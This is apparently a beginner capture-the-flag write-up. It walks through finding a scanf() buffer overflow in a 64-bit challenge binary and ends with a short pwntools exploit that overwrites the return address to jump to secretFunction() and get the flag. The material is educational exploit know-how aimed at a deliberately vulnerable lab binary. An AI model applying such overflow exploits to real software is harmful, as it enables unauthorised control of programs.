  We have been given a 64bit binary file to work with.

  #### Debugging/Decompiling the Binary 

  Run the chall file on **gdb** and looking into the functions present in it . 
  {command *info functions*}

  The functions in this challenge that are useful for us are

  #### Lets look  at the decompiled code in IDA/Ghidra 

  The ***main()*** function calls ***lab()*** first which looks like this.

  #### The Vulnerability

  There is a visible buffer overflow here that our string v1[] *(character array == string)* whose buffer length is 32 so we have a *potential buffer overflow here*. 

  To know more about buffer overflows in detail you can watch binary exploitation tutorial videos (Day 1 & Day 2) in the InCTFj Youtube channel [Day 1](https://www.youtube.com/watch?v=yMkyHCR7fqw&list=PLmpHrYT9y1Lyjbpq6LPtKC8RUnSyaf0Te&index=12) and [Day 2](https://www.youtube.com/watch?v=QoRgu0uiyA0&list=PLmpHrYT9y1Lyjbpq6LPtKC8RUnSyaf0Te&index=13)

  We have a *scanf()* vulnerabilty here that we are not checking on the length of the input we will be giving here as input

  **Coming back !!**

  Now lets see the other function that was left to be checked which was **secretFunction()** 

  ![](https://i.imgur.com/n3191Qo.png)

  Oh wow !! So now in this function we see that we are being guven the **flag** if this gets executed. 

  But one thing to observe is its neither called in **main()** nor it is called in **lab()**. 

  So lets use the vulnerabilty found to exploit this program and craft the payload. 

  First we will fill the buffer with the required bytes ie. 32. 

  `payload = b'a'* 32 `

  Then we have to overwrite the *rbp* with another 8 bytes to reach the *rip* in the stack frame .
  So now the payload would look like. 

  `payload = b'a'*32`
    `payload += b'b'*8 `
    
   Now that we have reached *rip* we will add the address of **secretFunction()** to our payload.
   
   So now our final **exploit** would look like 
   ```
   from pwn import *

  elf = ELF("./chall")
  context.binary = elf
  p = process("./chall")

  p.sendline("A"*40+p64(elf.symbols["secretFunction"]))
  p.interactive()
  ```
